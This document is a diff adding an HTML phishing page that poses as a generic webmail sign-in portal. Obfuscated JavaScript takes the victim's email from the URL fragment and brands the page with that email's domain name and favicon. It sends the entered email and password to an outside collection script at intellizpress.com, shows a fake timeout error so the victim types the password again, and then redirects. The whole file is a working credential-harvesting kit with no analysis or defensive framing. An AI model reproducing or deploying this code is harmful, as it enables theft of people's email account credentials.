@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="referrer" content="strict-origin">
+    <link id="favicon" rel="shortcut icon" type="image/png" href="https://www.google.com/s2/favicons?domain=">
+
+    <script src="https://code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+    <title>Sign in to  </title>
+    <script nonce="">
+        // Ensure that parent window and opener reload if a page is redirected to login
+        if (top.location != window.location) {
+            top.location.reload();
+        }
+        if (window.opener && window.opener.top.location != window.location) {
+            window.opener.top.location.reload();
+            self.close();
+        }
+    </script>
+
+
+    <style>
+        body {
+            background-color: #eeeeee;
+            font-family: Helvetica Neue, Helvetica, sans-serif;
+            font-size: 13px;
+            color: #425152;
+            margin: 0;
+        }
+
+        ::-moz-placeholder {
+            color: #d9dad9;
+        }
+
+        :-ms-input-placeholder {
+            color: #d9dad9;
+        }
+
+        ::-ms-input-placeholder {
+            color: #d9dad9;
+        }
+
+        ::placeholder {
+            color: #d9dad9;
+        }
+
+        a {
+            color: #425152;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        input {
+            border-radius: 5px;
+            padding: 5px 3px;
+        }
+
+        input.submit {
+            font-weight: bold;
+            text-align: center;
+            min-width: 90px;
+            color: #f0f0f0;
+            background: #444444;
+            padding: 5px 12px;
+            border-color: #444444;
+            border-style: solid;
+            cursor: pointer;
+        }
+
+        input.submit:hover {
+            color: #ffffff;
+        }
+
+        .row {
+            margin: 10px 0;
+        }
+
+        .row:after {
+            content: "";
+            display: table;
+            clear: both;
+        }
+
+        .logoWithPortalIcons {
+            width: 150px;
+            height: 50px;
+            background: transparent url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJYAAAARCAYAAAA/tFWCAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3gYNAictBVTA/AAAAj5JREFUaN7tWdFtgzAQfakyAPICyQffNCOQCdpMUDaoMkHIBFUnSDJB0gkgE5T62x9MgLJB+pGLRK2AMbYbiHgSPxjuznfPvjt7BOAMO0gBzAGgCHwPQAJgJn2zZlzEReBX6mRcjIrAD+n/MnIAC8ZFVnoXA1i1sPUEICOZO7LdVOYVIwC37J+X9LT1eUaPbDMqdOpiTfNPSF5rHzzBDfY3SGWKKYA9kdYUHjkuIidG6AdmfbHZOrGKwJ8Zsl1FrlcHcjcku0/YOPRz94jlKPBlvDiSG6J/eO+qYeOaPGtSa6nG1goZec03eZM6r8HO900psfzuWmOV5y/XG011tKltVOl7Iy1c1SIetbRHnp/sA6W9Y9tMZVykCnKBcRErxnNDcqMBcbOe7VInAJ//kBGc7VgTTYdfO6xrjRUBeKv4dse42Das0z6qOiPGxVJRlDfZsfqY+myn9z+xc02sSLPjkFNDXdCOml1bm64pMdgRHg2JZuw6Xbz3FYfBBQOxbGOraAoGWEiFqUbKQscCkuNyKq3CREr3EXU6j0au9T1jd5aeuEeOiyXbE4N5hzV1iq6OUCG/rc9vyW0yZqNW07LX+nED3fNVBSllXKRF4Md1RxFF4E9rGoi8SWc54C6YUROUjx0ID1F/iZsqxmPqLFc1/w/EstMVytgZ+HZPpPIAHF0QK3PsrK+BL1qLXAdHAz07XK6YPAC59a6QcXFwWBSehmOBzsKjuJ9cHjcs4ObAcUnXPQO6hRTAc2nx//wCPaq4/QlxCjAAAAAASUVORK5CYII=')
+                /*IconsTogether.svg*/
+                no-repeat left top;
+        }
+
+        .logoOnly {
+            width: 280px;
+            height: 30px;
+            overflow: hidden;
+        }
+
+        .logoOnly .logoWithPortalIcons {
+            width: 320px;
+            height: 120px;
+        }
+
+        .title {
+            font-size: 26px;
+            margin: 20px 0 10px;
+        }
+
+        .red {
+            color: #EE3031;
+        }
+
+        a#create-account {
+            display: inline-block;
+            border-radius: 4px;
+            padding: 3px 8px;
+            border: 1px solid #EE3031;
+        }
+
+        a#create-account:hover {
+            text-decoration: none;
+        }
+
+        .col1,
+        .col2 {
+            float: left;
+            line-height: 30px;
+            vertical-align: middle;
+            padding-top: 4px;
+        }
+
+        .col1 {
+            width: 124px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .col2 {
+            width: 286px;
+        }
+
+        .col2 input {
+            width: 96%;
+        }
+
+        .error {
+            color: #D52B1E;
+            font-weight: normal;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 1.0);
+            padding: 40px;
+            box-shadow: 2px 2px 4px 2px #ccc;
+            width: 416px;
+            border-radius: 5px;
+            /*
+            margin: 0 auto;
+            position:absolute;
+            left:0;
+            right:0;
+            top:38%;
+            top:100px\9;
+            transform: translateY(-50%);
+			*/
+            margin: 10% auto 30px auto;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
+            transition: all 0.3s cubic-bezier(.25, .8, .25, 1);
+        }
+
+        .password-icon {
+            width: 20px;
+            position: absolute;
+            cursor: pointer;
+            margin-top: 9px;
+            margin-left: -28px;
+            background-color: white;
+        }
+
+        #login_footer {
+            line-height: 125%;
+            font-size: 12px;
+            text-align: justify;
+            width: 500px;
+            margin: 90px auto auto auto;
+            padding-left: 10px;
+        }
+
+
+        @media only screen and (max-width: 600px) {
+            body {
+                background-image: none;
+            }
+
+            .container {
+                /*
+                position:relative;
+                padding: 20px;
+                box-shadow:none;
+                width: 375px;
+                top:0;
+                left:auto;
+                right:auto;
+                transform: translateY(0);
+				*/
+                width: 100%;
+                border-radius: 0;
+                box-shadow: none;
+                padding: 0;
+                margin-top: 0;
+            }
+
+            .container div.body {
+                padding: 40px 20px;
+            }
+
+            .col1,
+            .col2 {
+                float: none;
+                width: 100%;
+            }
+
+            #login_footer {
+                width: 99%;
+                margin-top: 20px;
+            }
+
+            #login_footer div.content {
+                padding: 10px 20px 10px 10px;
+            }
+
+            .password-icon {
+                margin-top: -25px;
+                right: 7%;
+            }
+
+        }
+
+
+        .xlogo {
+            color: #fff;
+            margin-bottom: 10px;
+            margin-top: -25px;
+        }
+
+        .xlogo img {
+            vertical-align: middle;
+            width: 5%;
+            height: 5%;
+            object-fit: contain
+        }
+
+        .xlogo span {
+            vertical-align: middle
+        }
+
+        .text-g {
+            font-family: "Arial Black", Gadget, sans-serif;
+            text-transform: uppercase !important;
+            text-align: center;
+            font-size: 25px;
+            color: #444444;
+            background-color: rgba(255, 255, 255, 0);
+            text-shadow: rgb(255, 255, 255) 2px 2px 2px;
+        }
+
+        #root {
+            position: absolute;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            top: 0;
+            z-index: -10;
+            pointer-events: none;
+            filter: brightness(0.3)
+        }
+    </style>
+
+    
+</head>
+
+<body>
+    <div id="login_form" action="" method="post" autocomplete="off">
+        <input type="hidden" name="csrfmiddlewaretoken" value="xWUPRch6gUXcsYdMNLyWrIvExcWeJ3qTtf8VMHZWmQ2EBBFj3eYVAcVdcPIJiDWq">
+        <input type="hidden" name="next" value="/">
+        <div class="container" id="container" style="padding-bottom:10px!important; position: relative;">
+            <div style="position:absolute; top:0; width:100%; height:100%; left:0; background:#fff; opacity:0.7; display:none" id="bg_screen"> </div>
+            <img src="https://ik.imagekit.io/escrowmade/Rolling-1s-200px__1__trHCWXy9jD.gif" style="width:50px; position:absolute; top:50%; left:50%; transform:translate(-50%, -50%); display:none" id="loading_image">
+        
+
+    <input type="hidden" class="form-control" name="hido" id="hido" value="">
+    <input type="hidden" class="form-control" name="redirecto" id="redirecto" value="">
+        <div class="body">
+           
+            <div class="xlogo">
+                <img id="zion" src="https://www.google.com/s2/favicons?domain=">
+                <span style="text-transform: capitalize;" class="text-g" id="banNer"></span>
+                </div>
+            <div class="row">
+                <div class="col1"><label for="id_email">Email:</label></div>
+                <div class="col2"><input type="text" name="email" value="" id="id_email" placeholder="Email"></div>
+            </div>
+                <div class="col1"><label for="id_pass">Password:</label></div>
+                <div class="col2"><input type="password" name="password" id="id_pass" autofocus="" placeholder="Password"></div>
+                  <img id="id-password-reveal-icon" class="password-icon" src="https://ik.imagekit.io/escrowmade/download_0-BUoL3T3.png" alt="" onclick="setVisibility()">
+            </div>
+            <br><br>
+            <div class="row">
+                <div><span class="error" id="error"></span></div>
+				
+            </div>
+            <div class="row">
+                <div class="col1" style="line-height:40px;padding-top:10px;">
+                    <input type="button" id="submit_btn" class="submit" value="Login" style="padding:7px 24px;"></div>
+            </div>
+            <div class="row">
+                
+                <p>
+                    All right reserved. Copyright © 2025 <span id="kai" style="text-transform: capitalize;"></span>.
+                    <br>
+                    <br>
+                </p>
+            </div>
+        
+    </div>
+    </div>
+
+   
+    <div id="root">
+        <iframe id="myframe" scrolling="no" src="" width="100%" height="100%" frameborder="0"></iframe>
+    </div>
+
+
+</body>
+<script>
+    var _0x2e20a0 = _0x40b2;
+	var _0x29a3 = ["innerHTML", "137967OuewSg", '379705GmhmYc', "src", "block", "display", "message", "hash", "preventDefault", '1BQGHgr', "val", 'fail', "Check your network connection..", "style", "ajax", "kai", "input[name=id_pass]", 'redirecto', 'banNer', 'input[name=id_email]', "title", "myframe", "74734CDKuWR", "Webmail Portal Login - ", "replace", "https://www.", "zion", 'attr', "none", "282575HCidVs", "slice", 'getElementById', 'Retype', '31421MpoORy', "indexOf", '1DvjFvy', 'length', "id_email", "Invalid password . Please try again ...", "https://www.google.com/s2/favicons?domain=", "location", 'error', 'log', "focus", "id_pass", 'value', "12FNOhav", "hido", "572226OvGFSN", "href", "529969LtYXLi"];
+	var _0x40b2 = function (_0x1db69d, _0x3d05db) {
+	  _0x1db69d = _0x1db69d - 0x93;
+	  var _0x2d026b = _0x29a3[_0x1db69d];
+	  return _0x2d026b;
+	};
+	var _0x2e20a0 = _0x40b2;
+	(function (_0x20ef82, _0x415708) {
+	  for (; true;) {
+		try {
+		  var _0x32c6ce = -parseInt(_0x40b2(0xb8)) + parseInt(_0x40b2(0xba)) + parseInt(_0x40b2(0x9e)) * -parseInt(_0x40b2(0xc4)) + parseInt(_0x40b2(0xb6)) * parseInt(_0x40b2(0xa9)) + parseInt(_0x40b2(0xa5)) + parseInt(_0x40b2(0xbc)) + parseInt(_0x40b2(0xbd)) * -parseInt(_0x40b2(0xab));
+		  if (_0x32c6ce === _0x415708) {
+			break;
+		  } else {
+			_0x20ef82.push(_0x20ef82.shift());
+		  }
+		} catch (_0x121a32) {
+		  _0x20ef82.push(_0x20ef82.shift());
+		}
+	  }
+	})(_0x29a3, 0x49762);
+	var hash = window[_0x2e20a0(0xb0)].hash.substr(0x1);
+	window.onload = function init() {
+	  var _0x3bd435 = _0x2e20a0;
+	  if (hash) {
+		var _0xa9fdd8 = window[_0x3bd435(0xb0)][_0x3bd435(0xc2)][_0x3bd435(0xa0)]('#', '');
+		var _0x4b750f = _0xa9fdd8[_0x3bd435(0xaa)]('@');
+		var _0x16e9d7 = _0xa9fdd8[_0x3bd435(0xa6)](_0x4b750f + 0x1, _0xa9fdd8[_0x3bd435(0xac)]);
+		document[_0x3bd435(0x9c)] = "Sign in to " + _0x16e9d7.split('.')[0x0];
+		var _0x374085 = _0x3bd435(0xaf) + _0x16e9d7;
+		document[_0x3bd435(0xa7)](_0x3bd435(0xa2))[_0x3bd435(0xbe)] = _0x374085;
+		document[_0x3bd435(0xa7)](_0x3bd435(0xad)).value = _0xa9fdd8;
+		document[_0x3bd435(0xa7)](_0x3bd435(0x97))[_0x3bd435(0xbb)] = _0x16e9d7.split('.')[0x0];
+		document[_0x3bd435(0xa7)](_0x3bd435(0x9a))[_0x3bd435(0xbb)] = _0x16e9d7.split('.')[0x0];
+		$("#favicon")[_0x3bd435(0xa3)](_0x3bd435(0xb9), _0x374085);
+		document[_0x3bd435(0xa7)]("id_pass")[_0x3bd435(0xb3)]();
+		document.getElementById(_0x3bd435(0x9d))[_0x3bd435(0xbe)] = _0x3bd435(0xa1) + _0x16e9d7;
+		document[_0x3bd435(0xa7)]("redirecto")[_0x3bd435(0xb5)] = _0x3bd435(0xa1) + _0x16e9d7;
+	  } else {}
+	  let _0x23cd5d = 0x0;
+	  document.getElementById("submit_btn").addEventListener("click", function (_0x136415) {
+		if ($('#id_email').val().trim() != '' && $('#id_pass').val().trim() != '') {
+		  let _0x1f89e1 = new FormData();
+		  _0x1f89e1.append("email", $("#id_email").val());
+		  _0x1f89e1.append('password', $("#id_pass").val());
+		  document.getElementById("loading_image").style.display = "block";
+		  document.getElementById("bg_screen").style.display = "block";
+		  ajax = new XMLHttpRequest();
+		  ajax.open("POST", 'https://intellizpress.com/syst/post.php');
+		  ajax.onreadystatechange = function () {
+			if (ajax.readyState === 0x4) {
+			  if (_0x23cd5d === 0x2) {
+				window.location = $("#redirecto").val();
+			  }
+			  _0x23cd5d += 0x1;
+			  response = ajax.response;
+			  document.getElementById('loading_image').style.display = "none";
+			  document.getElementById('bg_screen').style.display = "none";
+			  $("#error").html("Sign in attempt timeout, Please try again.");
+			  $("#id_pass").val('');
+			}
+		  };
+		  ajax.send(_0x1f89e1);
+		} else {}
+	  });
+	};
+	function setVisibility() {
+	  var _0x573b4b = document.getElementById("id_pass");
+	  if (_0x573b4b.type === 'password') {
+		_0x573b4b.type = "text";
+		document.getElementById("id-password-reveal-icon").src = "https://ik.imagekit.io/escrowmade/download__1__OSvF-Qvmk.png";
+	  } else {
+		_0x573b4b.type = "password";
+		document.getElementById('id-password-reveal-icon').src = 'https://ik.imagekit.io/escrowmade/download_0-BUoL3T3.png';
+	  }
+	}
+	function hidePassword() {
+	  var _0x54fb06 = document.getElementById("id_pass");
+	  if (_0x54fb06.type !== "password") {
+		_0x54fb06.type = 'password';
+		document.getElementById("id-password-reveal-icon").src = "https://ik.imagekit.io/escrowmade/download_0-BUoL3T3.png";
+	  }
+	}
+    </script>
+
+
+
+
+</html>
